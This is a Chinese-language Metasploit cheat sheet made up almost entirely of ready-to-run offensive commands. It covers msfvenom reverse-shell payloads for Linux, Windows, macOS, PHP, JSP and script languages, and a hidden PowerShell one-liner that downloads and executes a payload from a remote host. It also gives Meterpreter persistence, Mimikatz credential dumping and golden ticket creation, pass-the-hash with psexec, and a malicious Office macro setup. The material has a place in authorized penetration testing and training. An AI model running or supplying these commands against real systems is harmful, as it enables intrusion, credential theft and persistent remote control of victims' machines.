# Metasploit

## 概述

* [安装](#安装)
* [会话](#会话)
* [后台处理程序](#后台处理程序)
* [基础Meterpreter](#基础-meterpreter)
  * [生成一个meterpreter](#生成一个meterpreter)
  * [Meterpreter Webdelivery](#meterpreter-webdelivery)
  * [获取系统](#获取系统)
  * [持久性启动](#持久性启动)
  * [网络监控](#网络监控)
  * [端口转发](#端口转发)
  * [上传/下载](#上传---下载)
  * [从内存执行](#从内存执行)
  * [Mimikatz](#mimikatz)
  * [传递哈希 - PSExec](#传递哈希---psexec)
  * [使用SOCKS代理](#使用socks代理)
* [Metasploit脚本](#metasploit脚本)
* [多重传输](#多重传输)
* [精选 - 漏洞利用](#精选---漏洞利用)
* [参考资料](#参考资料)

## 安装

```powershell
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

## 会话

```powershell
CTRL+Z   -> 将会话放入后台
sessions -> 列出所有会话
sessions -i session_number -> 与指定ID的会话交互
sessions -u session_number -> 将会话升级为meterpreter
sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-> 将会话升级为meterpreter

sessions -c cmd           -> 在多个会话上执行命令
sessions -i 10-20 -c "id" -> 在多个会话上执行命令
```

## 后台处理程序

ExitOnSession：如果meterpreter死亡，处理程序将不会退出。

```powershell
screen -dRR
sudo msfconsole

use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false

generate -o /tmp/meterpreter.exe -f exe
to_handler

[ctrl+a] + [d]
```

## 基础Meterpreter

### 生成一个meterpreter

```powershell
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '
' > shell.php && pbpaste >> shell.php
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
```

### Meterpreter Webdelivery

设置在端口8080上监听的PowerShell Web交付。

```powershell
use exploit/multi/script/web_delivery
set TARGET 2
set payload windows/x64/meterpreter/reverse_http
set LHOST 10.0.0.1
set LPORT 4444
run
```

```powershell
powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
```

### 获取系统

```powershell
meterpreter > getsystem
...通过技术1（命名管道模拟（内存中/管理员））获取系统。

meterpreter > getuid
服务器用户名：NT AUTHORITY\SYSTEM
```

### 持久性启动

```powershell
选项：

-A        自动启动匹配的exploit/multi/handler以连接到代理
-L <opt>  在目标主机上写入有效载荷的位置，如果没有则使用%TEMP%
-P <opt>  要使用的有效载荷，默认为windows/meterpreter/reverse_tcp。
-S        自动在启动时以服务形式启动代理（具有SYSTEM权限）
-T <opt>  使用备用可执行文件模板
-U        用户登录时自动启动代理
-X        系统启动时自动启动代理
-h        此帮助菜单
-i <opt>  每次连接尝试之间的间隔时间（以秒为单位）
-p <opt>  运行Metasploit的系统监听的端口
-r <opt>  运行Metasploit监听回连的系统的IP

meterpreter > run persistence -U -p 4242
```

### 网络监控

```powershell
# 列出接口
run packetrecorder -li

# 记录接口编号1
run packetrecorder -i 1
```

### 端口转发

```powershell
portfwd add -l 7777 -r 172.17.0.2 -p 3006
```

### 上传/下载

```powershell
upload /path/in/hdd/payload.exe exploit.exe
download /path/in/victim
```

### 从内存执行

```powershell
execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
```

### Mimikatz

```powershell
load mimikatz
mimikatz_command -f version
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::wdigest
mimikatz_command -f sekurlsa::searchPasswords
mimikatz_command -f sekurlsa::logonPasswords full
```

```powershell
load kiwi
creds_all
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
```

### 传递哈希 - PSExec

```powershell
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > exploit
SMBDomain             WORKGROUP                                                          no        用于身份验证的Windows域
SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        指定用户的密码
SMBUser               Lambda                                                             no        作为进行身份验证的用户名
```

### 使用SOCKS代理

```powershell
setg Proxies socks4:127.0.0.1:1080
```

## 编写Metasploit脚本

使用`.rc文件`编写要执行的命令，然后运行`msfconsole -r ./file.rc`。
以下是一个简单的示例，用于部署处理程序并创建带有宏的Office文档。

```powershell
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z


use exploit/multi/fileformat/office_word_macro 
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.14.22
set LPORT 4646
exploit
```

## 多传输方式

```powershell
msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
```

然后，在AddTransports.ps1中

```powershell
Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30
```

## 最佳利用 - 漏洞

* MS17-10 永恒之蓝 - `exploit/windows/smb/ms17_010_eternalblue`
* MS08_67 - `exploit/windows/smb/ms08_067_netapi`

## 参考资料

* [Meterpreter有效载荷中的多传输方式 - ionize](https://ionize.com.au/multiple-transports-in-a-meterpreter-payload/)
* [创建Metasploit有效载荷 - Peleus](https://netsec.ws/?p=331)